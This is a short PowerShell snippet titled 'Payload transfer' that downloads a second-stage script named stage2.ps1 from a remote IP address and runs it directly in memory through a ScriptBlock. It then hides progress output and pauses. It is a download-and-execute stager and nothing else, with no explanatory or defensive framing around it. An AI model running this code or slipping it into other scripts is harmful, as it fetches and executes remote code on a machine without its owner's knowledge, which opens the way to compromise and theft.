
# Payload transfer
$DownloadUrl = 'https://203.0.113.143/stage2.ps1'
$ScriptText = (New-Object Net.WebClient).DownloadString($DownloadUrl)
& ([ScriptBlock]::Create($ScriptText))
$ProgressPreference = "SilentlyContinue"
Start-Sleep -Seconds 8
